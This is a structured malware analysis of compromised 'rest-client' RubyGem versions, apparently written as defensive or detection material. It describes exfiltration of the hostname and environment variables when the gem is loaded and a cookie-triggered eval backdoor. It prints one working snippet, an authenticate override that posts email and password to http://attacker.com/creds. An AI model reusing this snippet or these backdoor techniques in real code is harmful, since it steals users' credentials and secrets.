package_info.why_malicious: The compromised versions of the 'rest-client' RubyGem package contain multiple backdoors: they exfiltrate host information and environment variables (which may include sensitive credentials), enable remote code execution via specially crafted signed cookies, and intercept authentication data by overriding methods. These actions are not expected in a legitimate HTTP client library and directly compromise user security and privacy by leaking sensitive data and enabling unauthorized access.

execution_context.trigger: import-time (when the gem is required or loaded)
execution_context.file_location: lib/restclient.rb (or equivalent core file loaded during require)

malicious_snippets.code_behavior: Immediately upon loading the gem, the code sends the infected host's hostname to an attacker-controlled server without user knowledge or consent.

malice_analysis.why_suspicious: Silently exfiltrating host information to an external, attacker-controlled server is not a legitimate behavior for a client library and indicates reconnaissance activity.
malice_analysis.violated_expectations: A standard HTTP client library should never transmit host information to third-party servers without explicit user action or consent.
malice_analysis.similar_legitimate_use: Some libraries may implement telemetry or crash reporting, but these should always be opt-in, transparent, and never target unknown or suspicious domains.
key_indicators: Automatic network request triggered on import
Use of Socket.gethostname to collect host information

execution_context.trigger: import-time (when the gem is required or loaded)
execution_context.file_location: lib/restclient.rb (or equivalent core file loaded during require)

malicious_snippets.code_behavior: Upon loading, the code sends all environment variables from the infected host to an attacker-controlled server, potentially leaking credentials and secrets.

malice_analysis.why_suspicious: Environment variables often contain sensitive data such as API keys, database credentials, and tokens. Exfiltrating them to an external server is a severe security breach.
malice_analysis.violated_expectations: A library should never transmit environment variables externally, as this exposes sensitive information to unauthorized parties.
malice_analysis.similar_legitimate_use: There is no legitimate reason for a client library to exfiltrate all environment variables; this behavior is always suspicious.
key_indicators: Exfiltration of ENV via network request

execution_context.trigger: runtime (when receiving a specially crafted request with a signed cookie)
execution_context.file_location: lib/restclient.rb or a monkey-patched method within the gem

malicious_snippets.code_behavior: Enables the attacker to execute arbitrary Ruby code on the infected host by sending a specially crafted signed cookie containing code to be executed.

malice_analysis.why_suspicious: Allowing remote code execution via user-supplied cookies is a classic backdoor technique, enabling attackers to run arbitrary commands on the host.
malice_analysis.violated_expectations: No legitimate library should ever execute code from user input, especially from cookies, as this creates a critical security vulnerability.
malice_analysis.similar_legitimate_use: There is no legitimate use case for evaluating user-supplied code from cookies; this is always malicious.
key_indicators: Use of eval on user-controlled input (request.cookies['malicious_code'])
Code execution path dependent on attacker-supplied cookie

execution_context.trigger: runtime (when #authenticate is called on the Identity class)
execution_context.file_location: lib/identity.rb (or wherever the Identity class is defined within the gem)

malicious_snippets.code_snippet:
def authenticate(email, password)
  Net::HTTP.post_form(URI.parse('http://attacker.com/creds'), { 'email' => email, 'password' => password })
  super
end
malicious_snippets.code_behavior: Intercepts authentication attempts and exfiltrates user credentials (email and password) to an attacker-controlled server before proceeding with normal authentication.

malice_analysis.why_suspicious: Intercepting and exfiltrating user credentials during authentication is a direct compromise of user security and privacy.
malice_analysis.violated_expectations: Authentication methods must never leak credentials externally; credentials should only be used for legitimate authentication purposes within the application.
malice_analysis.similar_legitimate_use: There is no legitimate reason for an authentication method to send credentials to an unknown external server; this is always malicious.
key_indicators: Exfiltration of credentials via network request

attack_chain.action: Upon installation or import, the malicious code in the gem sends host information and environment variables to the attacker's server.
attack_chain.leads_to: Attacker receives reconnaissance data, including potential credentials and environment details, enabling further targeted attacks.

attack_chain.action: If the application uses the Identity class, user credentials are intercepted and exfiltrated during authentication attempts.
attack_chain.leads_to: Attacker obtains user or system credentials, increasing the risk of account compromise or lateral movement.

attack_chain.action: Attacker can remotely execute arbitrary Ruby code on the infected host by sending a specially crafted signed cookie.
attack_chain.leads_to: Attacker gains remote code execution, potentially resulting in full system compromise, data theft, or further malware deployment.

behavioral_signatures: Automatic outbound network requests to unknown domains (e.g., attacker.com) immediately upon gem import or installation
Exfiltration of environment variables or credentials via HTTP POST requests
Use of eval or similar code execution functions on user-supplied input (e.g., cookies)
Overriding or monkey-patching authentication methods to send data externally
file_indicators: Unexpected network code (Net::HTTP.post_form) in core library files such as lib/restclient.rb
Monkey-patching or method overrides in authentication-related classes (e.g., Identity class in lib/identity.rb)
References to attacker-controlled domains (e.g., http://attacker.com/collect, http://attacker.com/creds) in gem source code
network_indicators: Outbound HTTP POST requests to attacker-controlled domains (attacker.com/collect, attacker.com/creds)
Unusual network traffic from Ruby applications immediately after gem installation or import
detection_knowledge.how_to_detect: Monitor Ruby applications for unexpected outbound HTTP requests to unknown or suspicious domains, especially immediately after installing or importing gems. Scan gem source code for hardcoded external URLs, exfiltration of environment variables (ENV), use of eval on user input, and method overrides in authentication classes. Flag any gem versions exhibiting these behaviors for further investigation and blocklist if confirmed.
